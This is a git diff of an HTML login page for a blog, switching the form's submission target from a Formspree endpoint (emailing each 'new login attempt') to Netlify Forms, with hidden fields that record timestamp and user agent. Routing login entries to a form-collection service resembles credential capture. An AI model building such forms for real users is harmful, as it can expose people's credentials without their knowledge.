@@ -26,17 +26,14 @@
         </header>
 
         <div class="login-container">
-            <form id="loginForm" class="login-form" name="login-form" method="POST" action="https://formspree.io/f/xldarown">
-                <!-- Formspree 配置 -->
-                <input type="hidden" name="_subject" value="🚀 新的登录尝试 - 博客系统">
-                <input type="hidden" name="_next" value="blog.html">
-                <input type="hidden" name="_cc" value="">
-                <!-- Formspree 不需要 _captcha 和 _template 字段 -->
+            <form id="loginForm" class="login-form" name="login-form" method="POST" data-netlify="true">
+                <input type="hidden" name="form-name" value="login-form">
+                <!-- Netlify Forms 配置 - 完全免费，无需外部服务 -->
 
                 <!-- 数据收集字段 -->
                 <input type="hidden" name="loginMethod" id="loginMethod" value="email">
-                <input type="hidden" name="timestamp" id="timestamp">
-                <input type="hidden" name="userAgent" id="userAgent">
+                <input type="hidden" name="timestamp" id="timestamp" value="">
+                <input type="hidden" name="userAgent" id="userAgent" value="">
 
                 <div class="form-group">
                     <label for="email">
